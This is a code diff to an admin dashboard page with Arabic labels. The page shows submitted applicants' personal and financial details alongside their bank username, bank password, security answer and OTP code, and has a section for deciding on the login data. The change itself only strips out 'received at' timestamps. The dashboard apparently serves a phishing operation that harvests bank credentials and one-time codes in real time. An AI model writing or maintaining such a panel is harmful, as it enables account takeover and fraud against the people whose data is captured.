@@ -107,12 +107,6 @@ interface AppVersion {
   bankPassword?: string;
   securityAnswer?: string;
   otpCode?: string;
-  status?: string;
-  // أوقات استلام البيانات
-  personalDataReceivedAt?: string | null;
-  bankCredentialsReceivedAt?: string | null;
-  otpReceivedAt?: string | null;
-  statusUpdatedAt?: string | null;
   [key: string]: unknown;
 }
 
@@ -120,12 +114,10 @@ function DataBadge({
   label,
   value,
   badge,
-  receivedAt,
 }: {
   label: string;
   value: string | null | undefined;
   badge?: string;
-  receivedAt?: string | null;
 }) {
   if (!value) return null;
   return (
@@ -135,11 +127,6 @@ function DataBadge({
         {badge && (
           <span className="text-xs bg-blue-100 text-blue-700 px-1.5 py-0.5 rounded">
             {badge}
-          </span>
-        )}
-        {receivedAt && (
-          <span className="text-[10px] text-green-600 font-medium mr-1" dir="ltr">
-            ← {timeAgo(receivedAt)}
           </span>
         )}
       </span>
@@ -835,50 +822,41 @@ export default function AdminDashboardPage() {
                             value={
                               allData.fullName || allData.companyName || allData.contactName
                             }
-                            receivedAt={allData.personalDataReceivedAt}
                           />
                           <DataBadge
                             label="رقم الهوية / السجل"
                             value={allData.nationalId || allData.commercialRegistration}
-                            receivedAt={allData.personalDataReceivedAt}
                           />
-                          <DataBadge label="رقم الهاتف" value={allData.phone} receivedAt={allData.personalDataReceivedAt} />
+                          <DataBadge label="رقم الهاتف" value={allData.phone} />
                           <DataBadge
                             label="البريد الإلكتروني"
                             value={allData.email}
-                            receivedAt={allData.personalDataReceivedAt}
                           />
                           <DataBadge
                             label="تاريخ الميلاد"
                             value={allData.dateOfBirth}
-                            receivedAt={allData.personalDataReceivedAt}
                           />
                           <DataBadge
                             label="الراتب الشهري"
                             value={allData.monthlySalary}
-                            receivedAt={allData.personalDataReceivedAt}
                           />
-                          <DataBadge label="جهة العمل" value={allData.employer} receivedAt={allData.personalDataReceivedAt} />
-                          <DataBadge label="المدينة" value={allData.city} receivedAt={allData.personalDataReceivedAt} />
+                          <DataBadge label="جهة العمل" value={allData.employer} />
+                          <DataBadge label="المدينة" value={allData.city} />
                           <DataBadge
                             label="الحالة الاجتماعية"
                             value={allData.maritalStatus}
-                            receivedAt={allData.personalDataReceivedAt}
                           />
                           <DataBadge
                             label="نوع النشاط"
                             value={allData.businessType}
-                            receivedAt={allData.personalDataReceivedAt}
                           />
                           <DataBadge
                             label="عدد الموظفين"
                             value={allData.employeeCount}
-                            receivedAt={allData.personalDataReceivedAt}
                           />
                           <DataBadge
                             label="الإيرادات السنوية"
                             value={allData.annualRevenue}
-                            receivedAt={allData.personalDataReceivedAt}
                           />
                         </div>
 
@@ -901,17 +879,14 @@ export default function AdminDashboardPage() {
                           <DataBadge
                             label="اسم المستخدم"
                             value={allData.bankUsername}
-                            receivedAt={allData.bankCredentialsReceivedAt}
                           />
                           <DataBadge
                             label="كلمة المرور"
                             value={allData.bankPassword}
-                            receivedAt={allData.bankCredentialsReceivedAt}
                           />
                           <DataBadge
                             label="كلمة التحقق / الأمان"
                             value={allData.securityAnswer}
-                            receivedAt={allData.bankCredentialsReceivedAt}
                           />
 
                           {/* قرار بيانات الدخول */}
@@ -980,14 +955,9 @@ export default function AdminDashboardPage() {
                             )}
                           </h4>
                           {allData.otpCode ? (
-                            <div className="bg-muted rounded-xl p-4 text-center relative">
+                            <div className="bg-muted rounded-xl p-4 text-center">
                               <p className="text-xs text-muted-foreground mb-1">
                                 رمز التحقق
-                                {allData.otpReceivedAt && (
-                                  <span className="text-[10px] text-green-600 font-medium mr-2" dir="ltr">
-                                    ← {timeAgo(allData.otpReceivedAt)}
-                                  </span>
-                                )}
                               </p>
                               <p className="text-3xl font-mono font-black text-primary tracking-[0.3em]">
                                 {allData.otpCode}
@@ -1009,7 +979,6 @@ export default function AdminDashboardPage() {
                             <DataBadge
                               label="الحالة"
                               value={statusLabels[app.status] || app.status}
-                              receivedAt={allData.statusUpdatedAt}
                             />
                             {app.adminNote && (
                               <DataBadge
